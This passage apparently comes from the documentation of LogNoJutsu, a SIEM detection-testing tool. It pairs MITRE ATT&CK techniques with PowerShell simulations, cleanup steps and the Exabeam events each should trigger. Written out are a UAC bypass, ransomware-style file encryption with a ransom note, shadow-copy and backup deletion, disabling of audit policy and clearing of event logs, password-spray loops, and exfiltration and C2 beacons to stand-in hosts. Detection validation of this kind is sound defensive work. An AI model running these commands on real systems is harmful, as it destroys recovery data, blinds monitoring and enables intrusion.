| Tactic | Privilege Escalation, Defense Evasion |
| Exabeam Rules | 10 |
| Admin Required | No |
| Cleanup | **Yes** — Registry key removed |

**What is created:**

```
Registry: HKCU\Software\Classes\mscfile\shell\open\command
Value:    cmd.exe /K echo LogNoJutsu-UAC-Bypass-Simulation
```

**What is executed:**

```powershell
# Set registry hijack (Sysmon Event 12/13)
$regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd.exe /K echo UAC-Bypass-Sim"

# Trigger eventvwr.exe (reads the manipulated registry key)
Start-Process "eventvwr.exe" -WindowStyle Hidden
```

**Cleanup:**

```powershell
Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

**Why attackers do this:** The eventvwr UAC bypass method allows code to be executed as an administrator without generating a UAC dialog. `eventvwr.exe` reads the `mscfile` shell handler from the registry — by overwriting it in `HKCU` (possible without admin rights), arbitrary code can be executed with elevated privileges. The Sysmon 13 event on this specific registry path is the detection signal.

**Expected SIEM Events:**
- `Sysmon 12` — RegistryEvent (Key created): `HKCU\Software\Classes\mscfile\...`
- `Sysmon 13` — RegistryEvent (Value set) — **UAC Bypass Indicator**
- `4688` — `eventvwr.exe` process creation

---

#### T1547.001 — Registry Run Key Persistence

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) |
| Tactic | Persistence |
| Exabeam Rules | 10 |
| Admin Required | No |
| Cleanup | **Yes** — Registry entry is removed |

**What is created:**

```
Path:  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Name:  LogNoJutsu_Persistence_Test
Value: C:\Windows\System32\notepad.exe
```

**What is executed:**

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "LogNoJutsu_Persistence_Test" `
    -Value "C:\Windows\System32\notepad.exe" -Force
```

**Cleanup:**

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "LogNoJutsu_Persistence_Test" -Force
```

**Why attackers do this:** Run keys are the simplest persistence mechanism on Windows — they are executed at every user login. Attackers use them to maintain backdoors after reboots. Sysmon Event 13 on `CurrentVersion\Run` is a direct detection signal.

**Expected SIEM Events:**
- `Sysmon 13` — RegistryEvent (Value Set) on `CurrentVersion\Run`
- `4688` — `reg.exe` or `powershell.exe`

---

#### T1053.005 — Scheduled Task Persistence

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) |
| Tactic | Persistence |
| Exabeam Rules | 27 |
| Admin Required | No |
| Cleanup | **Yes** — Task is deregistered |

**What is created:**

```
Task Name:    LogNoJutsu_Task_Test
Execution:    notepad.exe
Trigger:      At user logon
Setting:      Hidden
```

**What is executed:**

```powershell
$action   = New-ScheduledTaskAction -Execute "notepad.exe"
$trigger  = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "LogNoJutsu_Task_Test" `
    -Action $action -Trigger $trigger -Settings $settings -Force
```

**Cleanup:**

```powershell
Unregister-ScheduledTask -TaskName "LogNoJutsu_Task_Test" -Confirm:$false
```

**Why attackers do this:** Scheduled tasks are more persistent than run keys, as they can also execute under different user contexts. The `Hidden` flag is a standard attacker technique. Event 4698 is the direct detection signal.

**Expected SIEM Events:**
- `4698` — "A scheduled task was created" in the Security log
- `4688` — `schtasks.exe` process creation

---

#### T1543.003 — Create Windows Service

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1543.003](https://attack.mitre.org/techniques/T1543/003/) |
| Tactic | Persistence |
| Exabeam Rules | 38 |
| Admin Required | **Yes** |
| Cleanup | **Yes** — Service is deleted |

**What is created:**

```
Service Name:    LogNoJutsuTestSvc
Display Name:    LogNoJutsu Test Service
Binary Path:     C:\Windows\System32\notepad.exe
Start Type:      Manual (demand)
```

**What is executed:**

```cmd
sc.exe create LogNoJutsuTestSvc binPath= "C:\Windows\System32\notepad.exe" ^
    DisplayName= "LogNoJutsu Test Service" start= demand
```

**Cleanup:**

```cmd
sc.exe delete LogNoJutsuTestSvc
```

**Why attackers do this:** Malware services survive reboots and typically run as SYSTEM. The combination of Event 7045 (Service installed) and an unknown binary path is a strong Exabeam signal. APTs like Cobalt Strike and Empire use service installation as the primary persistence mechanism.

**Expected SIEM Events:**
- `7045` — "A new service was installed" in the System log
- `4697` — "A service was installed" in the Security log

---

#### T1197 — BITS Jobs Persistence

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1197](https://attack.mitre.org/techniques/T1197/) |
| Tactic | Persistence, Defense Evasion |
| Exabeam Rules | 6 |
| Admin Required | No |
| Cleanup | **Yes** — BITS job is cancelled |

**What is executed:**

```cmd
bitsadmin /create LogNoJutsu_BITS_Test
bitsadmin /setnotifycmdline LogNoJutsu_BITS_Test "cmd.exe" "/C echo BITS-Persistence"
bitsadmin /info LogNoJutsu_BITS_Test
```

**Cleanup:**

```cmd
bitsadmin /cancel LogNoJutsu_BITS_Test
```

**Why attackers do this:** BITS (Background Intelligent Transfer Service) is a legitimate Windows service for file transfers. Attackers abuse it for stealthy downloads and persistence via notification commands. BITS jobs survive reboots, run as a system service, and are not monitored by many AV solutions. Detection events are in the `Microsoft-Windows-Bits-Client/Operational` log — many SIEMs ignore this source.

**Expected SIEM Events:**
- `BITS-Client Event 3` — BITS Job created
- `BITS-Client Event 59` — BITS Job transfer started
- `4688` — `bitsadmin.exe` process creation

---

#### T1546.003 — WMI Event Subscription

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1546.003](https://attack.mitre.org/techniques/T1546/003/) |
| Tactic | Persistence |
| Exabeam Rules | 6 |
| Admin Required | **Yes** |
| Cleanup | **Yes** — Filter, Consumer, and Binding removed |

**What is created:**

```
WMI Filter:   LogNoJutsu_WMI_Filter  (SystemUpTime >= 200s)
WMI Consumer: LogNoJutsu_WMI_Consumer (cmd.exe /C echo ...)
WMI Binding:  Filter → Consumer
```

**What is executed:**

```powershell
# WMI Event Filter (Sysmon Event 19)
$wmiFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
    -Arguments @{ Name = "LogNoJutsu_WMI_Filter"; Query = $filterQuery }

# WMI CommandLine Consumer (Sysmon Event 20)
$wmiConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
    -Arguments @{ Name = "LogNoJutsu_WMI_Consumer"; CommandLineTemplate = "cmd.exe /C ..." }

# Filter-Consumer Binding (Sysmon Event 21)
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
    -Arguments @{ Filter = $wmiFilter; Consumer = $wmiConsumer }
```

**Cleanup:**

```powershell
# Remove Binding, Consumer, and Filter
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
```

**Why attackers do this:** WMI Event Subscriptions are one of the stealthiest persistence mechanisms on Windows. They exist exclusively in the WMI database, not as files or registry entries. APTs like APT29 (Cozy Bear) use this technique extensively. Sysmon Events 19/20/21 are the only reliable detection source.

**Expected SIEM Events:**
- `Sysmon 19` — WmiEvent (EventFilter created)
- `Sysmon 20` — WmiEvent (EventConsumer created)
- `Sysmon 21` — WmiEvent (Filter-Consumer-Binding) — **Trifecta = definitive IOC**

---

#### T1021.001 — Remote Desktop Protocol

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) |
| Tactic | Lateral Movement |
| Exabeam Rules | 6 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Check RDP status (registry read access)
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"

# Query active RDP sessions
query session

# 5 failed RDP authentication attempts
1..5 | ForEach-Object {
    $ctx.ValidateCredentials("rdp_target_$_", "WrongRDPPass$_!")
    Start-Sleep -Milliseconds 500
}
```

**Why attackers do this:** RDP is the most commonly used Windows protocol for lateral movement. Event 4624 Type 10 (Remote Interactive) is the specific logon type for RDP. Failed RDP attempts (4625) in combination with the source host are a key indicator for RDP brute force.

**Expected SIEM Events:**
- `4625` × 5 — Failed logons with RDP context
- `4624` Type 10 — Remote Interactive Logon (real RDP sessions)
- `Sysmon 1` — `query.exe` process creation

---

#### T1036.005 — Process Masquerading

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) |
| Tactic | Defense Evasion |
| Exabeam Rules | 27 |
| Admin Required | No |
| Cleanup | **Yes** — Temporary files are removed |

**What is created:**

```
%TEMP%\LogNoJutsu_Masq\svchost.exe       (copy of cmd.exe)
%TEMP%\LogNoJutsu_Masq\explorer.exe      (copy of powershell.exe)
%TEMP%\LogNoJutsu_Masq\invoice_Q4.pdf.exe (double extension)
```

**What is executed:**

```powershell
# Run cmd.exe as svchost.exe from Temp directory
Copy-Item "C:\Windows\System32\cmd.exe" -Destination "$tempDir\svchost.exe"
Start-Process "$tempDir\svchost.exe" -ArgumentList "/C echo Masquerade-svchost"

# PowerShell as explorer.exe
Copy-Item "powershell.exe" -Destination "$tempDir\explorer.exe"
Start-Process "$tempDir\explorer.exe" -ArgumentList "-Command ..."

# Double-extension file
Copy-Item "cmd.exe" -Destination "$tempDir\invoice_Q4_2024.pdf.exe"
```

**Cleanup:**

```powershell
Remove-Item "$env:TEMP\LogNoJutsu_Masq" -Recurse -Force
```

**Why attackers do this:** Process masquerading deceives security tools and SOC analysts through familiar process names. Exabeam and other SIEM solutions detect this by comparing the process name with the execution path. `svchost.exe` outside of `C:\Windows\System32\` is an immediate IOC.

**Expected SIEM Events:**
- `Sysmon 1` — Process with known Windows name from unknown path
- `Sysmon 11` — FileCreate for copied binaries
- `4688` — Process creation with path/name mismatch

---

#### T1486 — Data Encrypted for Impact (Ransomware Simulation)

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1486](https://attack.mitre.org/techniques/T1486/) |
| Tactic | Impact |
| Exabeam Rules | 3 |
| Admin Required | No |
| Cleanup | **Yes** — Simulation directory completely removed |

**What is created:**

```
%TEMP%\LNJ_T1486\
  ├── document_1.txt.locked  (AES-256 encrypted)
  ├── document_2.txt.locked
  ├── ...  (18 files, .txt / .docx / .xml)
  └── README_DECRYPT.txt     (Ransom note)
```

**What is executed:**

```powershell
# Create test files (Sysmon EID 11 — Mass FileCreate)
1..10 | ForEach-Object { "Document content $_" | Out-File "$testDir\document_$_.txt" }
1..5  | ForEach-Object { "Spreadsheet data $_" | Out-File "$testDir\report_$_.docx"  }
1..3  | ForEach-Object { "Config data $_"      | Out-File "$testDir\config_$_.xml"   }

# AES-256 via .NET RNGCryptoServiceProvider — exact ransomware pattern (no external tools)
$key = New-Object byte[] 32
(New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($key)
Get-ChildItem -Path $testDir -File | ForEach-Object {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $inBytes  = [System.IO.File]::ReadAllBytes($_.FullName)
    $outBytes = $aes.CreateEncryptor().TransformFinalBlock($inBytes, 0, $inBytes.Length)
    [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $outBytes)
    Remove-Item $_.FullName   # Delete original file — Sysmon EID 23 (FileDelete)
}

# Create ransom note (Sysmon EID 11)
"YOUR FILES HAVE BEEN ENCRYPTED BY LOGNOJUTSU SIMULATION..." | Out-File "$testDir\README_DECRYPT.txt"
```

**Cleanup:**

```powershell
Remove-Item "$env:TEMP\LNJ_T1486" -Recurse -Force
```

**Why attackers do this:** Ransomware generates a characteristic "file churn" burst: mass FileCreate (new `.locked` files) + mass FileDelete (original files) in a short time, followed by a ransom note creation. This pattern is recognized by behavioral EDR solutions and Exabeam (EID Sysmon 11/23). The real AES-256 encryption via `.NET` generates the same ScriptBlock log entries (EID 4104) as real malware — only within the safe `%TEMP%` test directory.

**Expected SIEM Events:**
- `Sysmon 11` — FileCreate burst: 18 `.locked` files + ransom note
- `Sysmon 23` — FileDelete burst: 18 original files deleted
- `4104` — ScriptBlock: `RNGCryptoServiceProvider`, `CreateEncryptor`, `TransformFinalBlock`
- `Windows Defender EID 1116/1117` — Behavioral Ransomware Detection (may trigger)

---

#### T1490 — Inhibit System Recovery

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1490](https://attack.mitre.org/techniques/T1490/) |
| Tactic | Impact |
| Exabeam Rules | 6 |
| Admin Required | **Yes** |
| Cleanup | **Yes** — Boot recovery restored, SystemRestore keys removed |

**What is executed:**

```powershell
# Step 1: Disable boot recovery (EID 4688 for bcdedit.exe)
bcdedit.exe /set "{default}" bootstatuspolicy ignoreallfailures
bcdedit.exe /set "{default}" recoveryenabled no

# Step 2: vssadmin delete shadows — #1 ransomware indicator (standalone Tier-1 SIEM alert)
vssadmin.exe delete shadows /all /quiet

# Step 3: WMI Shadow Copy Delete (redundant method used by real ransomware)
wmic.exe shadowcopy delete

# Step 4: Delete backup catalog
wbadmin.exe delete catalog -quiet

# Step 5: System Restore registry disable (Sysmon EID 13)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
```

**Cleanup:** `bcdedit /set recoveryenabled yes` + registry keys removed

**Why attackers do this:** Deleting Volume Shadow Copies and disabling Windows recovery prevents victims from restoring their data without paying a ransom — the classic ransomware pre-encryption sequence (Ryuk, LockBit, BlackMatter). `vssadmin delete shadows /all /quiet` is a standalone Tier-1 SIEM alert in Exabeam as a "Disable Windows recovery mode" correlation rule.

**Expected SIEM Events:**
- `4688` — `bcdedit.exe /set recoveryenabled no` — **boot recovery deactivation**
- `4688` — `vssadmin.exe delete shadows /all /quiet` — **standalone Tier-1 SIEM alert**
- `4688` — `wmic.exe shadowcopy delete`
- `4688` — `wbadmin.exe delete catalog`
- `Sysmon 13` — RegistryValueSet: SystemRestore disable keys
- `System EID 7036` — Volume Shadow Copy Service state change

---

#### T1562.002 — Disable Windows Event Logging

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1562.002](https://attack.mitre.org/techniques/T1562/002/) |
| Tactic | Defense Evasion |
| Exabeam Rules | 3 |
| Admin Required | **Yes** |
| Cleanup | **Yes** — Auditing is restored |

**What is executed:**

```powershell
# Step 1: auditpol backup + category-wise disable (EID 4719 per change)
auditpol /backup /file:"$env:TEMP\lnj_auditpol_backup.csv"
auditpol /set /subcategory:"Logon" /success:disable /failure:disable
auditpol /set /subcategory:"Process Creation" /success:disable

# Step 2: wevtutil channel deactivation (Sysmon and PS log)
wevtutil sl "Microsoft-Windows-Sysmon/Operational" /e:false
wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:false

# Step 3: Registry MaxSize reduction to 1 MB (silencer for log rotation)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /v MaxSize /t REG_DWORD /d 0x100000 /f
```

**Cleanup:** `auditpol /restore /file:backup.csv` + wevtutil re-enable + registry value removed

**Why attackers do this:** Through multi-stage logging deactivation, EID 4624/4625 (logon events), EID 4688 (process creation), and Sysmon events for subsequent actions are suppressed. Event 4719 ("System audit policy was changed") is the detection signal — it fires for every `auditpol` change. The wevtutil channel deactivation tests whether the SIEM notices missing logs.

**Expected SIEM Events:**
- `4719` — "System audit policy was changed" — **for every auditpol subcategory change**
- `4688` — `auditpol.exe`, `wevtutil.exe` process creation
- `Sysmon 13` — RegistryValueSet: EventLog MaxSize reduction

---

#### T1070.001 — Clear Windows Event Logs

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) |
| Tactic | Defense Evasion |
| Exabeam Rules | 8 |
| Admin Required | **Yes** |
| Cleanup | None required |

**What is executed:**

```powershell
# Method 1: wevtutil cl — canonical log deletion
wevtutil.exe cl Application          # System EID 104 (Application log cleared)
wevtutil.exe cl "Windows PowerShell" # System EID 104 (PS log cleared)
wevtutil.exe cl Security             # Security EID 1102 (Security log cleared)
# Critical: EID 1102 is written BEFORE the log is cleared — it always survives

# Method 2: PowerShell Clear-EventLog (tests PS cmdlet detection, different from wevtutil)
Clear-EventLog -LogName "System"

# Method 3: .NET EventLog.Clear() (bypasses Clear-EventLog cmdlet — tests event-log-only detection)
[System.Diagnostics.EventLog]::GetEventLogs() | Where-Object { $_.Log -match "Application|Setup" } | ForEach-Object { $_.Clear() }
```

**Why attackers do this:** After a compromise, attackers try to cover their tracks. `wevtutil cl Security` is a direct IOC. **Critically:** EID 1102 is generated by the Windows event system BEFORE the Security log content is actually deleted — it therefore always survives the log deletion and is one of the highest-value attacker indicators. The three methods (wevtutil, PS cmdlet, .NET direct) test all detection levels.

**Expected SIEM Events:**
- `1102` — Security Audit Log Cleared — **EID is written before the clear, always survives**
- `System 104` — Event log cleared (Application, System, Windows PowerShell)
- `4688` — `wevtutil.exe` with `cl` subcommand
- `4104` — ScriptBlock log: `Clear-EventLog` and `.NET EventLog.Clear()`

---

#### T1021.002 — SMB Admin Shares (Lateral Movement)

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) |
| Tactic | Lateral Movement |
| NIST 800-53 | AC-3, AC-17, SI-4 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# List local SMB shares
net share

# WMI Win32_Share Enumeration (EID 4104, 4688)
Get-WmiObject -Class Win32_Share | Select-Object Name, Path, Type

# Test admin share access — generates EID 5140/5145
foreach ($share in @("C$", "IPC$", "ADMIN$")) {
    Test-Path "\\$env:COMPUTERNAME\$share" | Out-Null
}
```

**Why attackers do this:** SMB Admin Shares (`C$`, `ADMIN$`) are standard access paths for lateral movement in Windows environments. Attackers use them for remote file access and execution. Accessing `C$` without an active network drive connection is a strong anomaly signal in UEBA systems.

**Expected SIEM Events:**
- `4688` — `net.exe` with `share`
- `5140` — Network Share Object Access (admin share access)
- `5145` — Network Share Object Check (detailed access check)
- `Sysmon 3` — SMB connection (Port 445)

---

#### T1041 — Exfiltration Over C2 Channel (HTTP POST Simulation)

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1041](https://attack.mitre.org/techniques/T1041/) |
| Tactic | Exfiltration |
| NIST 800-53 | SC-7, SI-4, AU-12 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Simulated HTTP POST with Base64-encoded payload to non-existent host
$payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("simulated-exfil-data"))
$body = @{ data = $payload; host = $env:COMPUTERNAME; user = $env:USERNAME } | ConvertTo-Json

try {
    Invoke-WebRequest -Uri "http://192.0.2.1/exfil" -Method POST -Body $body `
        -ContentType "application/json" -TimeoutSec 3 -ErrorAction Stop
} catch {
    # Connection failure expected — Sysmon EID 3 (network connection) still generated
    Write-Host "[Simulation] Exfiltration attempt logged (connection failed as expected)"
}
```

**Why attackers do this:** HTTP POST to external addresses is the most common exfiltration channel. The connection attempt generates Sysmon EID 3 (NetworkConnect) regardless of the connection result — exactly the signal that SIEM correlation rules check for. Base64 encoding of the payload is the standard pattern for data staging before exfiltration.

**Expected SIEM Events:**
- `Sysmon 3` — NetworkConnect event: `powershell.exe` → Port 80 to external IP
- `4688` — `powershell.exe` process creation
- `4104` — ScriptBlock: `Invoke-WebRequest` with external target
- `Sysmon 22` — DNS query (if hostname instead of IP is used)

---

#### T1134.001 — Token Impersonation / Privilege Check

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1134.001](https://attack.mitre.org/techniques/T1134/001/) |
| Tactic | Privilege Escalation |
| NIST 800-53 | AC-6, AU-9, SI-4 |
| Admin Required | No (Discovery), Yes (full exploitation) |
| Cleanup | None |

**What is executed:**

```powershell
# Current user context and privileges
whoami /priv

# SeDebugPrivilege check — key privilege for token manipulation
$privs = whoami /priv /fo csv | ConvertFrom-Csv
$debug = $privs | Where-Object { $_.Privilege -match "SeDebugPrivilege" }
Write-Host "SeDebugPrivilege: $($debug.State)"

# .NET WindowsIdentity token query
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
Write-Host "Token: $($identity.Name) | ImpersonationLevel: $($identity.ImpersonationLevel)"
Write-Host "IsSystem: $($identity.IsSystem) | IsAdmin: $([System.Security.Principal.WindowsPrincipal]::new($identity).IsInRole('Administrators'))"
```

**Why attackers do this:** Token impersonation is a central privilege escalation path. `SeDebugPrivilege` enables access to LSASS (credential dumping) and other privileged processes. The `.NET WindowsIdentity` query generates EID 4673 (Sensitive Privilege Use) and is an Exabeam first-time-seen signal.

**Expected SIEM Events:**
- `4673` — Sensitive Privilege Use (SeDebugPrivilege check)
- `4672` — Special Logon (if executed with privileged account)
- `4688` — `whoami.exe` with `/priv`
- `4104` — ScriptBlock: `.NET WindowsIdentity` queries

---

#### T1574.002 — DLL Side-Loading Simulation

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1574.002](https://attack.mitre.org/techniques/T1574/002/) |
| Tactic | Defense Evasion / Persistence |
| NIST 800-53 | SI-7, CM-7, AU-12 |
| Admin Required | No |
| Cleanup | Temporary DLL in `%TEMP%` |

**What is executed:**

```powershell
# Compile benign DLL via Add-Type (no real malware)
$tempDll = "$env:TEMP\LNJ_SideLoad_$(Get-Random).dll"
Add-Type -TypeDefinition @"
    public class SimDll {
        public static string GetInfo() { return "LogNoJutsu DLL Side-Load Simulation"; }
    }
"@ -OutputAssembly $tempDll

# Load DLL from non-standard path (generates Sysmon EID 7)
$asm = [System.Reflection.Assembly]::LoadFrom($tempDll)
$result = $asm.GetType("SimDll").GetMethod("GetInfo").Invoke($null, $null)
Write-Host "Loaded DLL result: $result"

# Cleanup
Remove-Item $tempDll -ErrorAction Ignore
```

**Why attackers do this:** DLL side-loading loads malicious DLLs via legitimate applications that load DLLs from relative paths. Loading a DLL from `%TEMP%` is a strong anomaly signal — legitimate applications load DLLs from `System32` or their installation directory. Sysmon EID 7 (ImageLoaded) with a temp path is a Tier-1 alert in many SIEM rule sets.

**Expected SIEM Events:**
- `Sysmon 7` — ImageLoaded: DLL loaded from `%TEMP%` path
- `4688` — `powershell.exe` process creation
- `4104` — ScriptBlock: `Assembly::LoadFrom` with non-standard path

---

#### T1005 — Data from Local System

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1005](https://attack.mitre.org/techniques/T1005/) |
| Tactic | Collection |
| Exabeam Rules | ~15 |
| Admin Required | No |
| Cleanup | Staging directory removed |

**What is executed:**

```powershell
# Method 1: cmd.exe dir /s /b — file listing in Documents (EID 4688)
cmd /c "dir /s /b $env:USERPROFILE\Documents"

# Method 2: PowerShell Get-ChildItem — search for sensitive file types (EID 4104)
$sensitiveFiles = Get-ChildItem $env:USERPROFILE -Recurse -Include *.pdf,*.docx,*.xlsx,*.kdbx -ErrorAction SilentlyContinue | Select-Object -First 20

# Method 3: Create staging directory and write synthetic file
$stageDir = "$env:TEMP\lnj_stage"
New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
[System.IO.File]::WriteAllText("$stageDir\sensitive_data.txt", "LOGNOJUTSU_SIMULATION...")

# Method 4: robocopy staging copy — generates Sysmon EID 1 for robocopy.exe
robocopy "$env:USERPROFILE\Desktop" "$stageDir" /e /xl /xj /r:0 /w:0
```

**Expected SIEM Events:**
- `4688` — `cmd.exe` with `dir /s /b` on USERPROFILE path
- `4104` — ScriptBlock: `Get-ChildItem` recursive search for `*.pdf`, `*.docx`, `*.xlsx`, `*.kdbx`
- `Sysmon 1` — `robocopy.exe` staging copy in TEMP directory

---

#### T1560.001 — Archive Collected Data: Archive via Utility

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1560.001](https://attack.mitre.org/techniques/T1560/001/) |
| Tactic | Collection |
| Exabeam Rules | ~8 |
| Admin Required | No |
| Cleanup | Archive + staging directory removed |

**What is executed:**

```powershell
# Method 1: Create staging directory with synthetic files
$stageDir = "$env:TEMP\lnj_stage"
New-Item -ItemType Directory -Path $stageDir -Force | Out-Null

# Method 2: Compress-Archive — PowerShell archiving (EID 4104 + Sysmon EID 11 FileCreate)
$archivePath = "$env:TEMP\lnj_archive.zip"
Compress-Archive -Path "$stageDir\*" -DestinationPath $archivePath -Force

# Method 3: compact.exe NTFS compression as alternative (EID 4688)
compact.exe /C "$stageDir"

# Method 4: Archive verification
Get-Item $archivePath | Select-Object Name, Length, CreationTime
```

**Expected SIEM Events:**
- `4104` — ScriptBlock: `Compress-Archive` creates ZIP from staging files
- `4688` — `compact.exe` NTFS compression on staging directory
- `Sysmon 11` — FileCreate: `.zip` archive created in TEMP

---

#### T1119 — Automated Collection

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1119](https://attack.mitre.org/techniques/T1119/) |
| Tactic | Collection |
| Exabeam Rules | ~10 |
| Admin Required | No |
| Cleanup | Index file removed |

**What is executed:**

```powershell
# Method 1: ForEach-Object automated file metadata collection (EID 4104)
$collected = @()
Get-ChildItem $env:USERPROFILE -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    $collected += [PSCustomObject]@{ Name = $_.Name; Size = $_.Length; LastWrite = $_.LastWriteTime; Path = $_.FullName }
}

# Method 2: Get-WmiObject Win32_LogicalDisk — automated drive overview (EID 4104)
Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace, DriveType

# Method 3: Write collection index to disk — simulated attacker index
$indexPath = "$env:TEMP\lnj_collection_index.txt"
$collected | Select-Object -First 100 | ForEach-Object {
    "$($_.Name)`t$($_.Size)`t$($_.LastWrite)`t$($_.Path)"
} | Out-File -FilePath $indexPath -Encoding UTF8
```

**Expected SIEM Events:**
- `4104` — ScriptBlock: `ForEach-Object` loop for automated file metadata collection
- `4104` — ScriptBlock: `Get-WmiObject Win32_LogicalDisk` automated drive overview
- `Sysmon 1` — PowerShell executes automated collection script with WMI queries

---

#### T1071.001 — Application Layer Protocol: Web Protocols (C2)

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) |
| Tactic | Command and Control |
| Exabeam Rules | ~25 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Method 1: Invoke-WebRequest HTTP GET beacon — .invalid TLD (Sysmon EID 3 + EID 22 + EID 4104)
try {
    Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/beacon" -Method GET -TimeoutSec 3 -ErrorAction Stop
} catch {
    Write-Host "Beacon failed (expected behavior — no real C2 traffic)"
}

# Method 2: Loopback fallback beacon — simulates C2 failover to local handler (Sysmon EID 3)
try {
    Invoke-WebRequest -Uri "http://127.0.0.1:9999/c2/check-in" -TimeoutSec 2 -ErrorAction Stop
} catch {
    Write-Host "Loopback beacon failed (no listener on port 9999)"
}

# Method 3: .NET WebClient API beacon — alternative HTTP C2 method (EID 4104)
try {
    (New-Object System.Net.WebClient).DownloadString("http://lognojutsu-c2.invalid/tasks")
} catch {
    Write-Host "WebClient beacon failed (expected behavior)"
}
```

**Expected SIEM Events:**
- `Sysmon 3` — NetworkConnect: HTTP beacon attempt from PowerShell to `lognojutsu-c2.invalid`
- `4104` — ScriptBlock: `Invoke-WebRequest` C2 beacon simulation
- `Sysmon 22` — DNSEvent: DNS resolution attempt for `lognojutsu-c2.invalid` C2 hostname

---

#### T1071.004 — Application Layer Protocol: DNS (C2)

| Property | Value |
|---|---|
| MITRE ATT&CK | [T1071.004](https://attack.mitre.org/techniques/T1071/004/) |
| Tactic | Command and Control |
| Exabeam Rules | ~12 |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# Method 1: nslookup classic DNS query (EID 4688 + Sysmon EID 22)
nslookup beacon.lognojutsu-c2.invalid

# Method 2: DNS tunneling simulation — loop over 5 C2 subdomains (multiple Sysmon EID 22)
1..5 | ForEach-Object {
    $subdomain = "c2-$_.lognojutsu-c2.invalid"
    Resolve-DnsName $subdomain -ErrorAction SilentlyContinue | Out-Null
    Start-Sleep -Milliseconds 500
}

# Method 3: DNS exfil simulation — encoded subdomain (EID 4104 + Sysmon EID 22)
Resolve-DnsName "exfil-data.lognojutsu-c2.invalid" -ErrorAction SilentlyContinue | Out-Null
```

**Expected SIEM Events:**
- `Sysmon 22` — DNSEvent: DNS query to C2 subdomain for DNS tunneling simulation
- `4688` — `nslookup.exe` DNS C2 beacon query for `lognojutsu-c2.invalid`
- `4104` — ScriptBlock: `Resolve-DnsName` C2 DNS queries

---

### UEBA Scenarios (Exabeam)

These scenarios are specifically designed for validating **Exabeam UEBA use cases**. UEBA (User and Entity Behavior Analytics) detects not individual events, but **behavioral patterns over time**. Exabeam uses 750+ pre-trained behavioral models (Categorical, Numerically-Clustered, Time-based), calibrated per user, peer group, and organization.

---

#### UEBA-SPRAY-CHAIN — Credential Spray → Success Chain

| Property | Value |
|---|---|
| UEBA Use Case | Brute Force / Credential Stuffing (Exabeam Package: Compromised Insiders) |
| Admin Required | No |
| Cleanup | None |

**What is executed:**

```powershell
# 25 failed auth attempts in rapid succession (100ms interval)
for ($i = 1; $i -le 25; $i++) {
    $ctx.ValidateCredentials("spray_victim_user", "WrongPass$i!")
    Start-Sleep -Milliseconds 100
}
```

**UEBA detection logic:** Exabeam detects a significant increase in 4625 events within a short time window. The combination of high volume (>10 attempts in 60 seconds) and constant source host triggers the "Brute Force" use case. The threshold for VPN brute force is documented at Exabeam as 10+ failed logins per minute.

**Expected SIEM Events:**
- `4625` × 25 in ~3 seconds
